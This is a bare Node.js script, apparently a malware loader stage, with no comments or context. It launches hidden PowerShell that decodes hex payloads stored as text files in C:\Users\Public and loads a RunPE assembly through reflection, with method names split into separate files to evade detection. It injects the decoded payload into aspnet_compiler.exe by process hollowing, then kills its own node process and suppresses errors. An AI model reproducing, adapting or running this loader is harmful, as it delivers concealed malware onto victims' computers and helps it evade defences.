
var exec = require("child_process").exec;

var src = "" +

"function fromHex { param([string] $str)" +
"$hex = $str.Split(' '); $result = New-Object 'byte[]' ($hex.Count / 2);" +
"$count = 0; for ($i = 0; $i -lt $hex.Count - 1; $i += 2)" +
"{ $result[$count] = [byte]($hex[$i]); $count++;" +
"}" +
"return $result };" +

"$msg = (Get-Content -Path 'C:\\Users\\Public\\msg.txt');" +
"$runpe = (Get-Content -Path 'C:\\Users\\Public\\runpe.txt');" +
"$result = fromHex $msg;" +
"$runpeD = fromHex $runpe;" +
"$new = (Get-Content -Path 'C:\\Users\\Public\\NONNES404.txt');" +
"$Execute = (Get-Content -Path 'C:\\Users\\Public\\Execute.txt');" +
"$Invoke = (Get-Content -Path 'C:\\Users\\Public\\Invoke.txt');" +
"$load = (Get-Content -Path 'C:\\Users\\Public\\load.txt');" +
"$ype = (Get-Content -Path 'C:\\Users\\Public\\Gettype.txt');" +
"$getM = (Get-Content -Path 'C:\\Users\\Public\\getMethod.txt');";

var command = "[Reflection.Assembly]::$load([Byte[]]$runpeD).$ype($new).$getM($Execute).$Invoke($null,[Object[]]('C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe',$null,[Byte[]]$result,$true)); Stop-Process -Name 'node'";
src += command; 

exec("powershell.exe -Command \"" + src + "\"", function(err, stdout, stderr) {
    if(err) {
        return;
    }
});
